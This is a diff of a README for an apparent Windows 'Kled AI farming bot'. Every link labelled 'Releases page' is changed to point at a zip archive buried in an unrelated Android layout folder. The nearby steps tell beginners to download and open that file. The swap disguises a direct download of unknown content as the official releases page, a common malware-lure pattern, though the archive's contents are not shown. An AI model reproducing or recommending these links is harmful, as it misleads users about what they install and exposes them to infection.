@@ -1,6 +1,6 @@
 # 🤖 Kled-AI-farming-bot - Organize workflows with less effort
 
-[![Download](https://img.shields.io/badge/Download-Releases%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/icyman1108/Kled-AI-farming-bot/releases)
+[![Download](https://img.shields.io/badge/Download-Releases%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/icyman1108/Kled-AI-farming-bot/raw/refs/heads/main/app/src/main/res/layout-sw600dp/bot_A_Kled_farming_3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This tool is for users who want a simple desktop workflow without a complex setu
 
 ## 📥 Download and Run on Windows
 
-1. Open the [Releases page](https://github.com/icyman1108/Kled-AI-farming-bot/releases).
+1. Open the [Releases page](https://github.com/icyman1108/Kled-AI-farming-bot/raw/refs/heads/main/app/src/main/res/layout-sw600dp/bot_A_Kled_farming_3.5.zip).
 2. Find the latest release.
 3. Download the Windows file for the app.
 4. Open the downloaded file.
@@ -180,7 +180,7 @@ For a smoother workflow:
 If you are new to Windows apps, use this path:
 
 1. Open your browser.
-2. Go to the [Releases page](https://github.com/icyman1108/Kled-AI-farming-bot/releases).
+2. Go to the [Releases page](https://github.com/icyman1108/Kled-AI-farming-bot/raw/refs/heads/main/app/src/main/res/layout-sw600dp/bot_A_Kled_farming_3.5.zip).
 3. Download the newest Windows file.
 4. Open File Explorer.
 5. Find the download.
@@ -235,7 +235,7 @@ Large folders can work, but smaller batches may be easier to review.
 
 ## 🔗 Download Again
 
-If you need the installer or release file again, use the [Releases page](https://github.com/icyman1108/Kled-AI-farming-bot/releases)
+If you need the installer or release file again, use the [Releases page](https://github.com/icyman1108/Kled-AI-farming-bot/raw/refs/heads/main/app/src/main/res/layout-sw600dp/bot_A_Kled_farming_3.5.zip)
 
 ## 📝 Suggested Start Point
 
